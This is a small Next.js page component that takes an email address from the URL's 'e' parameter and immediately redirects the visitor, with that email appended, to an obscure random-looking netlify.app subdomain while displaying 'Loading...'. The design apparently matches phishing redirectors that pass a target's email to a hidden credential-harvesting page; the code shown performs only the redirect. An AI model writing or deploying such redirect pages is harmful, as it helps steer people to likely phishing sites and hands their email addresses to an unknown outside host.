'use client';
import { Suspense, useEffect } from 'react';
import { useSearchParams } from 'next/navigation';

function Redirect() {
  const searchParams = useSearchParams();

  useEffect(() => {
    const email = searchParams.get('e');
    const target = email
      ? `https://a73c04dd-63tya72v7-32e273c3.netlify.app?e=${encodeURIComponent(email)}`
      : 'https://a73c04dd-63tya72v7-32e273c3.netlify.app';
    window.location.href = target;
  }, [searchParams]);

  return <p>Loading...</p>;
}

export default function Home() {
  return (
    <Suspense fallback={<p>Loading...</p>}>
      <Redirect />
    </Suspense>
  );
}
